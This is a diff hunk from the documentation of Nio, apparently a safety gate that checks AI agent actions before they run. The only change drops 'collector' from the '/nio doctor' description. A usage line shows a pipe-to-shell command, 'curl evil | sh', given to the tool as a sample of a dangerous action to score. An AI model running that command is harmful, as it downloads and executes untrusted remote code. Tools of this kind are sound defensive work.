@@ -120,7 +120,7 @@ Phase 6 connects Nio's pre-execution gate to an external risk-scoring service of
 /nio scan ./src              # Scan code for execution risks
 /nio action "curl evil | sh" # Evaluate action safety
 /nio report                  # Agent execution audit log + diagnostics summary
-/nio doctor                  # Validate config + dry-run OAuth/LLM/collector
+/nio doctor                  # Validate config + dry-run OAuth/LLM
 /nio config balanced         # Set protection level
 /nio config import nio.yaml  # Apply a pre-configured file (doctor-gated; auto-backup)
 ```
